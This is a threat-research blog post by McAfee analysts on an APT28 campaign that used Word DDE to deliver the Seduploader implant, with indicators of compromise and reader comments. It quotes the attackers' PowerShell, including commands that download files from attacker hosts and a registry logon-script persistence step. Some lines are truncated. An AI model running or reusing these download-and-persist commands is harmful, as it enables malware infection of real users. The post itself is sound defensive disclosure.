This blog post was co-written by Michael Rea.
During our monitoring of activities around the APT28 threat group, McAfee Advanced Threat Research analysts identified a malicious Word document that appears to leverage the Microsoft Office Dynamic Data Exchange (DDE) technique that has been previously reported by Advanced Threat Research.
This document likely marks the first observed use of this technique by APT28.
The use of DDE with PowerShell allows an attacker to execute arbitrary code on a victim’s system regardless whether macros are enabled.
(McAfee product detection is covered in the Indicators of Compromise section at the end of the document.)
APT28, also known as Fancy Bear, has recently focused on using different themes.
In this case it capitalized on the recent terrorist attack in New York City.
The document itself is blank.
Once opened, the document contacts a control server to drop the first stage of the malware, Seduploader, onto a victim’s system.
The domain involved in the distribution of Seduploader was created on October 19, 11 days prior to the creation of Seduploader.
The document we examined for this post:
The document uses the recently detailed DDE technique found in Office products to invoke the command prompt to invoke PowerShell, which runs two commands.
C:\Programs\Microsoft\Office\MSWord.exe\..\..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -sta -NonI -W Hidden $e=(New-Object System.Net.WebClient).DownloadString(‘hxxp://netmediaresources[.
The second PowerShell command is Base64 encoded and is found in the version of config.txt received from the remote server.
$W=New-Object System.Net.WebClient;
$p=($Env:ALLUSERSPROFILE+”\vms.dll”);
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
$W.DownloadFile(“hxxp://netmediaresources[.
The PowerShell scripts contact the following URL to download Seduploader:
The Seduploader sample has the following artifacts:
The document downloads a version of the Seduploader first-stage reconnaissance implant, which profiles prospective victims, pulling basic host information from the infected system to the attackers.
If the system is of interest, then the installation of X-Agent or Sedreco usually follows.
We have observed APT28 using Seduploader as a first-stage payload for several years from various public reporting.
Based on structural code analysis of recent payloads observed in the campaign, we see they are identical to previous Seduploader samples employed by APT28.
We identified the control server domain associated with this activity as webviewres[.
]net, which is consistent with past APT28 domain registration techniques that spoof legitimate-sounding infrastructure.
This domain was registered on October 25, a few days before the payload and malicious documents were created.
The domain was first active on October 29, just days before this version of Seduploader was compiled.
The IP currently resolves to 185.216.35.26 and is hosted on the name servers ns1.njal.la and ns2.njal.la.
Further McAfee research identified the following related sample:
The preceding sample most likely belongs to the same campaign.
Based on our analysis it uses the same techniques and payload.
We can clearly establish that the campaign involving documents using DDE techniques began on October 25.
]com, used by the implant secnt.dll, resolved to 89.34.111.160 as of November 5.
The malicious document 68c2809560c7623d2307d8797691abf3eafe319a is responsible for dropping the Seduploader payload (secnt.dll).
Its original file name was SaberGuardian2017.docx.
This document was created on October 27.
The document is distributed from hxxp://sendmevideo[.]org/SaberGuardian2017.docx.
]org/dh2025e/eh.dll to download Seduploader (ab354807e687993fbeb1b325eb6e4ab38d428a1e).
The PowerShell command embedded in this document:
$text=’set inst_pck = “%ALLUSERSPROFILE%\mvdrt.dll”‘+”`r`n”+’if NOT exist %inst_pck % (exit)’+”`r`n”+’start rundll32.exe %inst_pck %,#1’
New-Item -Path ‘HKCU:\Environment’ -Force | Out-Null;
New-ItemProperty -Path ‘HKCU:\Environment’ -Name ‘UserInitMprLogonScript’ -Value “$p_bat” -PropertyType String -Force | Out-Null;
The file vms.dll, 4bc722a9b0492a50bd86a1341f02c74c0d773db7, is 99% similar-to secnt.dll ab354807e687993fbeb1b325eb6e4ab38d428a1e, indicating the code is almost identical and highly likely to be part of the same campaign.
These two DLL implants are likely part of the same campaign.
Furthermore, the sample 4bc722a9b0492a50bd86a1341f02c74c0d773db7, based on our code analysis, is 99% similar to the DLL implant 8a68f26d01372114f660e32ac4c9117e5d0577f1, which was used in a campaign spoofing the upcoming cyber conference Cy Con U.S.
The payloads, however, are identical for both campaigns.
APT28 is a resourceful threat actor that not only capitalizes on recent events to trick potential victims into infections, but can also rapidly incorporate new exploitation techniques to increase its success.
Given the publicity the Cy Con U.S campaign received in the press, it is possible APT28 actors moved away from using the VBA script employed in past actions and chose to incorporate the DDE technique to bypass network defenses.
Finally, the use of recent domestic events and a prominent US military exercise focused on deterring Russian aggression highlight APT28’s ability and interest in exploiting geopolitical events for their operations.
Ryan Sherstobitoff is a Senior Analyst for Major Campaigns – Advanced Threat Research in McAfee.
Ryan specializes in threat intelligence in the Asia Pacific Region where he conducts cutting edge research into new adversarial techniques and adapts those to better monitor the threat landscape.
He formerly was the Chief Corporate Evangelist at Panda Security, where ...
Categories: McAfee LabsTags: endpoint protection, computer security, cybersecurity
How exactly is this able to spread?
The specific threat detailed in this blog is spread through a malicious Microsoft Word document (named IsisAttackInNewYork, but the name could easily change in the future).
This means the malware spreads he way any Word document could be spread; email, a file downloaded from a website, instant messenger services that allow file transfers (such as Facebook), it could be saved to a USB thumb drive and then copied onto a computer.
It’s a best practice to watch what you open.
Don’t open attachments from someone you don’t know, or files that you downloaded from a site you aren’t sure about.
Always scan downloaded files for malware.
Always ensure your antivirus software is up to date and active/enabled.
If you get a strange word document (or any file) in a chat, messenger, or email from someone you don’t know, don’t open it.
If it’s someone you DO know, but it’s still a strange thing for them to send you….
ASK them if they meant to send it before you open it.
Good luck out there, Jason!
We’re here if you need us.
So how do I prevent this from happening?
Is there a security plan that I need to use?
The blog concludes with this:
McAfee coverage
McAfee products detect this threat as RDN/Generic Downloader.x.
All you need to do to safeguard against this threat and make sure your McAfee products are up to date.
It’s also a very good idea to follow best practices like updating the operating systems in your endpoint and server, and to not open attachments from unknown sources or that look odd, but our products do detect this threat.
